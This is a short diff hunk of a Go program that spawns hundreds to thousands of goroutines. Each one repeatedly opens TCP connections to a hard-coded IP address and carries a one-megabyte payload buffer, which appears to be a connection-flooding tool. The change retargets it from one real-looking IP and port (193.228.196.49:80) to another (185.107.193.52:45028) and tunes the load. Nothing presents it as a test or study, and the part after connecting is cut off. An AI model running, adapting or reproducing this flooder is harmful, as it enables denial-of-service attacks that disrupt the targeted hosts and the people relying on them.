@@ -7,14 +7,14 @@ import (
 
 func main() {
 	var wg sync.WaitGroup
-	data := make([]byte, 50024*50024) // 1 MB of data
+	data := make([]byte, 1024*1024) // 1 MB of data
 
-	for i := 0; i < 10000; i++ {
+	for i := 0; i < 1000; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
 			for {
-				conn, err := net.Dial("tcp", "193.228.196.49:80")
+				conn, err := net.Dial("tcp", "185.107.193.52:45028")
 				if err != nil {
 					continue // if connection fails, retry
 				}
